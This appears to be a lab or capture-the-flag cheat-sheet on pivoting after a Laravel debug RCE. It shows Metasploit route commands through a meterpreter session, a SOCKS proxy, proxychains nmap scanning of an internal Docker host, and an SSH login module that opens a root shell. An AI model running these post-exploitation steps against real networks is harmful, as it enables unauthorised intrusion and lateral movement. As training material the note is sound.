--- ---

<h2>Command</h2>
Since most of the docker or normal machine might not have the essential tools running on their system. It might be more convinient to simply proxy the target network on our attacking machine (from there we would be able to use our own tools to connect to different host on the internal network)

More information ---> [HERE](https://youtu.be/mZqNP2fOLlk?t=2509)


Routing the Service
```
# Discovered webserice_database IP
meterpreter > resolve webservice_database

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51

# Route it through the Meterpreter session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 2
[*] Route added
```

- website_databse             ---> Get this name from env or .env file in the docker, usualy located in var/www (webservice_database reffer to an internal ip address used has a database via internal DNS (webserver communicate with this IP/webservice_database in this case))
- /32                                    ---> Subnet specification (Generally speaking, `/32` means that the network has only a single IPv4 address and all traffic will go directly between the device with that IPv4 address and the default gateway. The device would not be able to communicate with other devices on the local subnet.)
- 2                                         ---> Meterpreter Session of the target machine


Routing Machine
```
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 2
[*] Route added
```

- /32                                    ---> Subnet specification (Generally speaking, `/32` means that the network has only a single IPv4 address and all traffic will go directly between the device with that IPv4 address and the default gateway. The device would not be able to communicate with other devices on the local subnet.)
- 172.17.0.1                           ---> Potential Target (Since we know we are in a docker environment, we know that there is a main machine running all those dockers (Here we guest that this address is the main target machine that we really want to compromise))
- 2                                      ---> Meterpreter Session of the target machine


Check the routing settings
```
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.1         255.255.255.255    Session 3
   172.28.101.51      255.255.255.255    Session 3


[*] There are currently no IPv6 routes defined.
```


Setup Sock Proxy
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 1.

[*] Starting the SOCKS proxy server
```


Using the target machine (From Normal Terminal --> Ubuntu Terminal)
```
# From the attacker’s host machine, we can use curl with the internal Docker IP to show that the web application is running, and the socks proxy works

$ curl --proxy socks5://127.0.0.1:1080 http://172.17.0.1

… etc …

# From the attacker’s host machine, we can use ProxyChains to scan the compromised host machine for common ports (YOU NEED TO CHANGE etc/proxychains.conf and add the 127.0.0.1 and the port set in the proxy module in metasploit (1080))

$ proxychains nmap -sV -sC -sT -Pn -F 172.17.0.1 -p 22,80,443,5432
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 08:48 EDT
Nmap scan report for 172.17.0.1
Host is up (0.069s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

-sT -Pn -F                        ---> Need to include those element to assure that the nmap will work great trougth the proxy


SSH login (Optinal)
```
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://santa_username_here:santa_password_here@172.17.0.1

[*] 172.17.0.1:22 - Starting bruteforce
[+] 172.17.0.1:22 - Success: 'santa_username_here:santa_password_here' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 4 opened (10.11.8.17-10.10.152.194:55634 -> 172.17.0.1:22) at 2022-11-22 02:49:43 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         shell cmd/unix                                   10.11.8.17:4444 -> 10.10.152.194:44140 (10.10.152.194)
  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.11.8.17:4433 -> 10.10.152.194:33312 (172.28.101.50)
  3         shell linux            SSH kali @                10.11.8.17-10.10.152.194:55632 -> 172.17.0.1:22 (172.17.0.1)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i -1
[*] Starting interaction with 3...